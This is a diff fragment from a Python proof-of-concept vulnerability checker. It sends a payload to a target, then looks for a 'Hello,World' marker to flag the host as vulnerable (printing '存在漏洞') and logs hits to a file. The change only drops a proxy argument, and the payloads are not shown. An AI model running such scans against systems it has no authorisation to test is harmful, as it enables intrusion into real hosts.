@@ -72,7 +72,7 @@ def poc(target):
     try:
         res = requests.post(url=target + payload, data=data, headers=headers, verify=False, timeout=5)
         if res.status_code == 200:
-            res1 = requests.get(url=target + payload1, data=data, verify=False, timeout=5, proxies=proxies)
+            res1 = requests.get(url=target + payload1, data=data, verify=False, timeout=5)
             if "Hello,World" in res1.text:
                 print(f"[+] {target} 存在漏洞")
                 with open("result3.txt", 'a') as f:
